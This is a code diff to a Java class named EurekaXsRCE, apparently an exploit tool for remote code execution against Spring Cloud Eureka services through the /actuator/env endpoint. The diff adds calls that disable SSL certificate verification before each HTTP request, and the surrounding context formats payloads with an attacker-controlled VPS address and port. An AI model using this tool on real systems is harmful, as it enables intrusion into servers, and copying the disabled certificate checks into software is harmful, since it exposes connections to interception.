@@ -13,6 +13,8 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Stream;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class EurekaXsRCE {
     private String address;
     private String vpsIP;
@@ -36,6 +38,7 @@ public class EurekaXsRCE {
         String llib = "spring-boot-starter-actuator";
         String llib1 = "spring-cloud-starter-netflix-eureka-client";
         String data = String.format(expData1,vpsIP + ":" + vpsPORT);
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -108,6 +111,7 @@ public class EurekaXsRCE {
         String llib = "spring-boot-starter-actuator";
         String llib1 = "spring-cloud-starter-netflix-eureka-client";
         String data = String.format(expData2,vpsIP + ":" + vpsPORT);
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -176,6 +180,7 @@ public class EurekaXsRCE {
         Stream.Builder<String> builder = Stream.builder();
         String api ="/actuator/env";
         String site = address + api;
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
